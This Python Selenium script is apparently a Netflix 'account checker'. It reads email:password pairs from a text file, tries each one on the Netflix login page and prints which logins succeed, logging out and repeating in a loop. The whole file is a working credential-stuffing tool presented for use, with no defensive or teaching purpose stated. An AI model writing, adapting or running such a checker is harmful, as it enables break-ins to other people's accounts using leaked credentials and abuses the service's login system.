from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from time import sleep
from secrets import username,password
#virtualenv venv
#source venv/bin/activate

#virtualenv env
#env\Scripts\activate.bat
#python -i listChecker.py
#bot = ListBot()

class ListBot():
    
    url = [] # To store the old and new urls
    usernames = [] # all of the usernames I'm getting from the file.
    passwords = [] # all of the passwords I'm getting from the file.
    number = 0
    acc = 0
    worked = True
    def __init__(self):
        self.driver = webdriver.Chrome()
        
    #This is the login Function. It allows us to login to the site with the credintials we have inside the txt file.
    def login(self,user,pswd):
        self.driver.get("https://www.netflix.com/ae-en/login")
        #This is there to make sure that the url list is empty after running multiple times, to make sure the elements don't overlap.
        if(len(self.url)>=1):
            self.url.clear()
        #store the url and append it to url.
        beforelogin_url = self.driver.current_url
        self.url.append(beforelogin_url)
        print(beforelogin_url)
        
        #Getting the Email btn xpath and using it.
        email_btn = self.driver.find_element_by_xpath('//*[@id="id_userLoginId"]') # getting the xpath.
        sleep(3)
        self.driver.execute_script("arguments[0].click();", email_btn) #This is here instead of the one above it, because this fixes the problem of the pressing 
        #button and allows it to go on top of the page to press on the elements.
        email_btn.send_keys(user) #type in the username we got from the file.
        
        #Getting the password and using it.
        pwd_btn = self.driver.find_element_by_xpath('//*[@id="id_password"]')#specifing the passwords button xpath.
        sleep(3)
        pwd_btn.click()#click on the password so we could enter the information.
        pwd_btn.send_keys(pswd) #type in the password we got from the file.
        
        #Locating and pressing on the Login_btn.
        login_btn = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button') # getting the xpath of the login_btn.
        login_btn.click() #clciking on the button so we could procced and login.
        
        #Storing the url after logging in.
        sleep(4)
        afterlogin_url = self.driver.current_url
        print(afterlogin_url)
        self.url.append(afterlogin_url)
        #Returning them so we could use them outside the fn.
        return self.url
        
        
    #Logout Function. This allows us to log out of the accoutn we entered.
    def logout(self):
        #Get the netflix logo that can be located on the top right and pressing on it.
        Netflix_Logo = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[1]/div/div/a')
        self.driver.execute_script("arguments[0].click();", Netflix_Logo)
        sleep(3)
        
        #If we got to this point it means that the account is valid, so we will logout and check the other accounts we have.
        
        #Now lets locate the dropdown menu and hover over it to get the option to sign out.
        dropdown_menu = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[1]/div/div/div/div[5]/div/div')
        
        #using the actions chain from selenium. Move to the drop down menu and then locate the signout_btn then press on it.
        actions = ActionChains(self.driver)
        actions.move_to_element(dropdown_menu)
        actions.perform()
        signout_btn = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[1]/div/div/div/div[5]/div/div[2]/div/ul[3]/li[3]/a')
        self.driver.execute_script("arguments[0].click();", signout_btn)


    #This function allows us to go back to the login screen.
    def relogin(self):
        #find and press the login button located on top of the screen.
        Newlogin_btn = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[2]/a[2]')
        self.driver.execute_script("arguments[0].click();", Newlogin_btn)
        
    
    #We use this function to access the file and read the files inside it. 
    def getAccounts(self):
        with open('account.txt', 'r') as file:
            for line in file:
                user, password = line.replace(" ","").split(':')
                self.usernames.append(user)
                self.passwords.append(password.strip())
            return(self.usernames,self.passwords)   
       
    #This checks if the login was successful or not.
    def checklogin_status(self):
        self.number= self.number + 1 #Account number to keep track.
        self.login(self.usernames[self.acc],self.passwords[self.acc]) #we login to the account.
        sleep(6) #wait to acquire the after the login url.
        if(self.url[0] != self.url[1]): #if the urls are not  the same then we logged in successfully.
            print("Successful!!!!")
            sleep(4)
            self.logout() #Try and logout.
            sleep(4)
            self.relogin()#Go back to the login page.
            self.worked = True # Make worked true.
            self.acc = self.acc + 1 # add one so we could try the next account.
        else:
            self.worked = False #it failed so change worked to false.
            print("failed to login!" + "account Nm:" + str(self.number))
            
    #This function is here,because sometimes the browsers asks the user if he forgot the password.
    #So, when it fails to continue its going to check this to see if it can continue using this.
    def forgetpassword_popup(self):
        signIn_btn = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[2]/a[2]')
        self.driver.execute_script("arguments[0].click();", signIn_btn)
        
    #This is what automates the bot.
    def autologing(self):
        while True:
            sleep(1)   
            if(self.worked): #if this is true, check the login status.
                self.checklogin_status()
            else: # else increase one to the account.
                self.acc = self.acc + 1
                #Try if there is the forget password pop up, if it is not there try logging in with another account.
                try:
                    self.forgetpassword_popup()
                except Exception:
                    self.checklogin_status()



#To run the bot.
bot = ListBot()
bot.getAccounts()
bot.autologing()
